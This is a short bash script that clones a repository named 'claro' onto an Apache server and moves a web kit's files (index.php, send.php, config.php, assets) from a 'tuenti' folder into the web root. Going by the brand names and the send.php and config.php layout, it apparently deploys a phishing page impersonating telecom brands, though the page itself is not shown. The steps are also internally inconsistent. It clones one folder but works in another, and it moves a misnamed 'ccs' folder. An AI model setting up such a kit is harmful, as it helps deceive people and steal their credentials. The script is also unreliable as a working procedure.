#!/bin/bash
cd /etc/apache2/sites-available; nano 000-default.conf
cd /var/www; git clone https://github.com/resekk-vps/claro
cd /var/www/tuenti; mv ccs /var/www; mv css /var/www; mv data /var/www; mv fonts /var/www; mv js /var/www; mv parts /var/www; mv config.php /var/www; mv favicon.png /var/www; mv index.php /var/www; mv send.php /var/www
cd /var/www; nano config.php
sudo service apache2 restart
